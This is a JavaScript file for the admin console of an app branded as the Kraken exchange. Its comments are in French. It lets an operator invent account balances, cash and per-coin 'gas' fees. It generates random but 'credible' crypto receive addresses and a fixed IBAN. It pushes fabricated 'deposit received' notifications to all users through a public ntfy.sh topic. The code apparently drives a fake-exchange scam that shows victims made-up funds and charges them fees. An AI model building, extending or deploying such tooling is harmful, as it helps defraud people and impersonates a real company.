/* Kraken — console d'administration. État partagé avec l'app via ntfy.sh. */
(() => {
  "use strict";

  const TOPIC = "kraken-partage-4b8d1c6f";
  const AKEY = "kraken_admin_v1";
  const JKEY = "kraken_admin_journal_v1";
  const $ = s => document.querySelector(s);
  const $$ = s => Array.from(document.querySelectorAll(s));

  const COINS = [
    { sym: "BTC", name: "Bitcoin", icon: "assets/img/coins/btc.svg" },
    { sym: "ETH", name: "Ethereum", icon: "assets/img/coins/eth.svg" },
    { sym: "USDC", name: "USDC", icon: "assets/img/coins/usdc.svg" },
    { sym: "SOL", name: "Solana", icon: "assets/img/coins/sol.svg" },
    { sym: "XRP", name: "XRP", icon: "assets/img/coins/xrp.svg" },
    { sym: "ADA", name: "Cardano", icon: "assets/img/coins/ada.svg" },
    { sym: "DOGE", name: "Dogecoin", icon: "assets/img/coins/doge.svg" },
    { sym: "SUI", name: "Sui", icon: "assets/img/coins/sui.svg" },
    { sym: "LINK", name: "Chainlink", icon: "assets/img/coins/link.svg" },
    { sym: "AVAX", name: "Avalanche", icon: "assets/img/coins/avax.svg" },
    { sym: "DOT", name: "Polkadot", icon: "assets/img/coins/dot.svg" },
    { sym: "HYPE", name: "Hyperliquid", icon: "assets/img/coins/hyperliquid.png" }
  ];
  const EUR = { sym: "EUR", name: "Euro", icon: "assets/img/flag_eu.webp" };
  const coin = s => s === "EUR" ? EUR : COINS.find(c => c.sym === s);

  const DEFAULTS = {
    first: "bernard", last: "", email: "bernard@exemple.com",
    cash: 0, gas: 2.40, balances: {}, fees: {}, addresses: {}, rev: 0
  };

  const load = () => {
    try {
      const p = JSON.parse(localStorage.getItem(AKEY) || "{}");
      return {
        ...structuredClone(DEFAULTS), ...p,
        balances: { ...(p.balances || {}) },
        fees: { ...(p.fees || {}) },
        addresses: { ...(p.addresses || {}) }
      };
    } catch { return structuredClone(DEFAULTS); }
  };
  let ST = load();
  let DSYM = "BTC";
  let busy = false;
  let lastSync = 0;

  const save = () => localStorage.setItem(AKEY, JSON.stringify(ST));
  const nf = (n, d = 2) => Number(n).toLocaleString("fr-FR", { minimumFractionDigits: d, maximumFractionDigits: d });
  const eur = n => nf(n, 2) + " €";
  const parseAmt = v => {
    if (typeof v !== "string") v = String(v ?? "");
    const n = parseFloat(v.replace(/\s/g, "").replace(",", "."));
    return Number.isFinite(n) ? n : 0;
  };
  const fmtWhen = ts => {
    const d = new Date(ts);
    return d.toLocaleDateString("fr-FR", { day: "2-digit", month: "short" }) + " · " +
      d.toLocaleTimeString("fr-FR", { hour: "2-digit", minute: "2-digit" });
  };
  const qtyTxt = (n, s) => nf(n, 8).replace(/0+$/, "").replace(/,$/, "") + " " + s;

  // ── adresses de réception crédibles, fixes par actif ─────────────────
  const B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
  const BECH = "qpzry9x8gf2tvdw0s3jn54khce6mua7l";
  const HEX = "0123456789abcdef";
  const rnd = (set, n) => {
    const b = new Uint8Array(n); crypto.getRandomValues(b);
    let s = ""; for (const x of b) s += set[x % set.length];
    return s;
  };
  const GEN = {
    BTC: () => "bc1q" + rnd(BECH, 38),
    ETH: () => "0x" + rnd(HEX, 40),
    USDC: () => "0x" + rnd(HEX, 40),
    LINK: () => "0x" + rnd(HEX, 40),
    AVAX: () => "0x" + rnd(HEX, 40),
    HYPE: () => "0x" + rnd(HEX, 40),
    SOL: () => rnd(B58, 44),
    XRP: () => "r" + rnd(B58, 33),
    ADA: () => "addr1q" + rnd(BECH, 56),
    DOGE: () => "D" + rnd(B58, 33),
    SUI: () => "0x" + rnd(HEX, 64),
    DOT: () => "1" + rnd(B58, 47),
    EUR: () => "FR76 3000 4006 9700 0123 4567 890"
  };
  const genAddr = sym => (GEN[sym] ? GEN[sym]() : "0x" + rnd(HEX, 40));

  function ensureAddresses() {
    let changed = false;
    for (const c of [...COINS, EUR]) {
      if (!ST.addresses[c.sym] || ST.addresses[c.sym].length < 10) {
        ST.addresses[c.sym] = genAddr(c.sym);
        changed = true;
      }
    }
    if (changed) save();
  }

  // ── transport ────────────────────────────────────────────────────────
  const snapshot = () => ({
    first: ST.first, last: ST.last, email: ST.email,
    cash: Number(ST.cash) || 0, gas: Number(ST.gas) || 0,
    balances: { ...ST.balances }, fees: { ...ST.fees },
    addresses: { ...ST.addresses }, rev: Number(ST.rev) || 0
  });

  async function publish(msg) {
    try {
      await fetch("https://ntfy.sh/" + TOPIC, {
        method: "POST", body: JSON.stringify({ app: "kraken", ...msg }),
        headers: { "Content-Type": "text/plain" }
      });
      setLive(true);
      return true;
    } catch { setLive(false); return false; }
  }

  async function publishState() {
    ST.rev = Date.now();
    save();
    const ok = await publish({ type: "state", state: snapshot() });
    renderSync();
    return ok;
  }

  function applyState(s) {
    if (!s || !(Number(s.rev) > (Number(ST.rev) || 0))) return false;
    ST.first = String(s.first ?? ST.first);
    ST.last = String(s.last ?? ST.last);
    ST.email = String(s.email ?? ST.email);
    ST.cash = Math.max(0, Number(s.cash) || 0);
    ST.gas = Math.max(0, Number(s.gas) || 0);
    ST.balances = { ...(s.balances || {}) };
    ST.fees = { ...(s.fees || {}) };
    ST.addresses = { ...(s.addresses || {}) };
    ST.rev = Number(s.rev);
    save();
    return true;
  }

  function setLive(on) {
    const l = $("#live");
    if (!l) return;
    l.classList.toggle("on", on);
    $("#liveTxt").textContent = on ? "En ligne" : "Hors ligne";
  }

  async function poll() {
    if (busy) return;
    busy = true;
    try {
      const r = await fetch("https://ntfy.sh/" + TOPIC + "/json?poll=1&since=all", { cache: "no-store" });
      const txt = await r.text();
      let best = null;
      for (const line of txt.split("\n")) {
        if (!line.trim()) continue;
        let m; try { m = JSON.parse(line); } catch { continue; }
        if (m.event !== "message" || !m.message) continue;
        lastSync = Math.max(lastSync, (Number(m.time) || 0) * 1000);
        let p; try { p = JSON.parse(m.message); } catch { continue; }
        if (p.app !== "kraken" || p.type !== "state" || !p.state) continue;
        if (!best || (Number(p.state.rev) || 0) > (Number(best.rev) || 0)) best = p.state;
      }
      if (best && applyState(best)) { ensureAddresses(); renderAll(); }
      setLive(true);
    } catch { setLive(false); }
    busy = false;
    renderSync();
  }

  // ── rendu ────────────────────────────────────────────────────────────
  function renderAccount() {
    $("#aFirst").value = ST.first || "";
    $("#aLast").value = ST.last || "";
    $("#aMail").value = ST.email || "";
    $("#aCash").value = nf(ST.cash || 0, 2);
    $("#aGas").value = nf(ST.gas || 0, 2);
  }

  function renderWallet() {
    $("#walletRows").innerHTML = COINS.map(c => {
      const b = ST.balances[c.sym];
      const f = ST.fees[c.sym];
      return `<div class="coinrow">
        <img class="coin" src="${c.icon}" alt="">
        <span class="sym">${c.sym}</span>
        <input data-bal="${c.sym}" inputmode="decimal" placeholder="0" value="${b ? String(b).replace(".", ",") : ""}">
        <span class="fee"><input data-fee="${c.sym}" inputmode="decimal" placeholder="${nf(ST.gas || 0, 2)}" value="${f ? String(f).replace(".", ",") : ""}"></span>
      </div>`;
    }).join("");
    $("#walletGrid").innerHTML = COINS.map(c =>
      `<button class="pick" data-add="${c.sym}"><img class="coin" src="${c.icon}" alt=""><b>${c.sym}</b></button>`
    ).join("");
  }

  function renderDeposit() {
    $("#depGrid").innerHTML = [...COINS, EUR].map(c =>
      `<button class="pick ${c.sym === DSYM ? "on" : ""}" data-dep="${c.sym}"><img class="coin" src="${c.icon}" alt=""><b>${c.sym}</b></button>`
    ).join("");
    const c = coin(DSYM);
    $("#dAmount").placeholder = DSYM === "EUR" ? "50,00" : "0,0154";
    $("#dAddr").value = ST.addresses[DSYM] || "";
    $("#dAddr").placeholder = DSYM === "EUR" ? "FR76 …" : "Adresse d'envoi";
    $("#dText").placeholder = "Dépôt de " + (DSYM === "EUR" ? "50,00 €" : "0,0154 " + DSYM) + " reçu sur votre compte";
    $("#dOwn").textContent = ST.addresses[DSYM] || "—";
    $("#dSend").textContent = DSYM === "EUR"
      ? "Envoyer le dépôt à tous les utilisateurs"
      : "Envoyer le dépôt à tous les utilisateurs";
  }

  function journal() {
    try { const a = JSON.parse(localStorage.getItem(JKEY) || "[]"); return Array.isArray(a) ? a : []; }
    catch { return []; }
  }

  function renderLog() {
    const list = journal();
    $("#logCard").innerHTML = list.length ? list.map(j => `
      <div class="jrow">
        <span class="jico"><svg viewBox="0 0 24 24"><path d="M12 19V5"/><path d="M6 11l6-6 6 6"/></svg></span>
        <div class="jmain">
          <div class="jtitle">${j.kind === "deposit" ? "Dépôt envoyé" : "Notification envoyée"}</div>
          <div class="jtext">${j.text || ""}</div>
          ${j.amount ? `<div class="jamt">+${j.asset === "EUR" ? eur(j.amount) : qtyTxt(j.amount, j.asset)}</div>` : ""}
          ${j.addr ? `<div class="jaddr">${j.addr}</div>` : ""}
          <div class="jwhen">${fmtWhen(j.at)}</div>
        </div>
      </div>`).join("") : `<div class="empty">Aucune notification envoyée pour le moment.</div>`;
  }

  function renderSync() {
    const r = ST.rev ? fmtWhen(ST.rev) : "—";
    const a = lastSync ? fmtWhen(lastSync) : "—";
    if ($("#syncRev")) $("#syncRev").textContent = r;
    if ($("#syncAt")) $("#syncAt").textContent = a;
  }

  function renderAll() {
    renderAccount(); renderWallet(); renderDeposit(); renderLog(); renderSync();
  }

  // ── actions ──────────────────────────────────────────────────────────
  let tT;
  function toast(m) {
    const t = $("#toast");
    t.textContent = m; t.classList.add("on");
    clearTimeout(tT); tT = setTimeout(() => t.classList.remove("on"), 2300);
  }

  async function saveAccount() {
    ST.first = $("#aFirst").value.trim() || "bernard";
    ST.last = $("#aLast").value.trim();
    ST.email = $("#aMail").value.trim() || ST.email;
    ST.cash = Math.max(0, parseAmt($("#aCash").value));
    ST.gas = Math.max(0, parseAmt($("#aGas").value));
    const ok = await publishState();
    renderAll();
    toast(ok ? "Compte mis à jour sur tous les appareils" : "Hors ligne — enregistré localement");
  }

  async function saveWallet() {
    $$("[data-bal]").forEach(inp => {
      const v = Math.max(0, parseAmt(inp.value));
      if (v > 0) ST.balances[inp.dataset.bal] = v;
      else delete ST.balances[inp.dataset.bal];
    });
    $$("[data-fee]").forEach(inp => {
      const v = Math.max(0, parseAmt(inp.value));
      if (v > 0) ST.fees[inp.dataset.fee] = v;
      else delete ST.fees[inp.dataset.fee];
    });
    const ok = await publishState();
    renderAll();
    toast(ok ? "Portefeuille synchronisé" : "Hors ligne — enregistré localement");
  }

  function pushJournal(o) {
    const list = journal();
    list.unshift(o);
    localStorage.setItem(JKEY, JSON.stringify(list.slice(0, 60)));
    renderLog();
  }

  async function sendDeposit() {
    const amount = Math.max(0, parseAmt($("#dAmount").value));
    if (!(amount > 0)) return toast("Saisissez le montant reçu");
    const addr = $("#dAddr").value.trim() || ST.addresses[DSYM] || "";
    const label = DSYM === "EUR" ? eur(amount) : qtyTxt(amount, DSYM);
    const text = $("#dText").value.trim() || ("Dépôt de " + label + " reçu sur votre compte");
    const credit = $("#dCredit").checked;

    if (credit) {
      if (DSYM === "EUR") ST.cash = Math.max(0, (Number(ST.cash) || 0) + amount);
      else ST.balances[DSYM] = (Number(ST.balances[DSYM]) || 0) + amount;
      ST.rev = Date.now();
      save();
    }

    const id = "d" + Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
    const jobs = [publish({ type: "notify", id, kind: "deposit", asset: DSYM, amount, addr, text })];
    if (credit) jobs.push(publish({ type: "state", state: snapshot() }));

    pushJournal({ id, kind: "deposit", asset: DSYM, amount, addr, text, at: Date.now() });
    const res = await Promise.all(jobs);
    renderAll();
    toast(res.some(Boolean) ? (credit ? "Dépôt envoyé et compte crédité" : "Dépôt envoyé à tous les utilisateurs") : "Hors ligne — dépôt non diffusé");
    if (res[0]) { $("#dAmount").value = ""; $("#dText").value = ""; }
  }

  async function sendNotice() {
    const text = $("#nText").value.trim();
    if (!text) return toast("Saisissez le message");
    const id = "n" + Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
    const ok = await publish({ type: "notify", id, kind: "notice", text });
    pushJournal({ id, kind: "notice", text, at: Date.now() });
    toast(ok ? "Notification envoyée à tous les utilisateurs" : "Hors ligne — notification non diffusée");
    if (ok) $("#nText").value = "";
  }

  // ── navigation ───────────────────────────────────────────────────────
  function tab(name) {
    $$(".view").forEach(v => v.classList.toggle("on", v.id === "v-" + name));
    $$(".tab").forEach(t => t.classList.toggle("on", t.dataset.tab === name));
    if (location.hash.slice(1) !== name) history.replaceState(null, "", "#" + name);
    scrollTo({ top: 0 });
  }

  $("#tabs").addEventListener("click", e => {
    const b = e.target.closest("[data-tab]");
    if (b) tab(b.dataset.tab);
  });

  $("#saveAccount").addEventListener("click", saveAccount);
  $("#saveWallet").addEventListener("click", saveWallet);
  $("#dSend").addEventListener("click", sendDeposit);
  $("#nSend").addEventListener("click", sendNotice);
  $("#syncNow").addEventListener("click", async () => { await poll(); toast("Synchronisé"); });
  $("#dCopy").addEventListener("click", () => {
    navigator.clipboard?.writeText(ST.addresses[DSYM] || "");
    toast("Adresse copiée");
  });
  $("#dRegen").addEventListener("click", async () => {
    ST.addresses[DSYM] = genAddr(DSYM);
    const ok = await publishState();
    renderAll();
    toast(ok ? "Nouvelle adresse de réception" : "Adresse enregistrée localement");
  });
  $("#clearLog").addEventListener("click", () => {
    localStorage.removeItem(JKEY); renderLog(); toast("Journal vidé");
  });

  $("#walletGrid").addEventListener("click", e => {
    const b = e.target.closest("[data-add]");
    if (!b) return;
    const s = b.dataset.add;
    if (!(s in ST.balances)) ST.balances[s] = 0;
    renderWallet();
    toast(s + " ajouté au portefeuille");
  });

  $("#depGrid").addEventListener("click", e => {
    const b = e.target.closest("[data-dep]");
    if (!b) return;
    DSYM = b.dataset.dep;
    renderDeposit();
  });

  addEventListener("scroll", () => {
    const t = $("#top");
    if (t) t.classList.toggle("scrolled", scrollY > 4);
  }, { passive: true });

  document.addEventListener("visibilitychange", () => { if (!document.hidden) poll(); });

  // ── démarrage ────────────────────────────────────────────────────────
  ensureAddresses();
  renderAll();
  const bootTab = location.hash.slice(1);
  if (["account", "wallet", "deposit", "log"].includes(bootTab)) tab(bootTab);
  poll();
  setInterval(poll, 15000);
})();
